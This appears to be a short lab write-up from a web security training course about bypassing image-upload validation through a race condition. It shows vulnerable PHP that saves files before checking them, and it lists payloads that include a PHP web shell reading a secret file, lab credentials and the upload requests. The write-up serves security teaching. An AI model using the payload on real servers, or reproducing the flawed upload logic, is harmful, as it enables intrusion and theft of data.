## Web shell upload via race condition

**Category:** file_upload
**Difficulty:** Unknown

### Description
This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

### Solution Steps
The vulnerable code that introduces this race condition is as follows:
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>

### Key Payloads
- `/home/carlos/secret`
- `wiener:peter`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `POST /my-account/avatar`
- `<YOUR-POST-REQUEST>`
- `<YOUR-GET-REQUEST>`
- `GET /files/avatars/<YOUR-IMAGE>`
- `POST`

### Indicators of Success
- Malicious file uploaded successfully
- Web shell accessible via URL
- Code execution confirmed
- File extension restriction bypassed
- Content-Type validation bypassed
---
*Source: PortSwigger Web Security Academy*
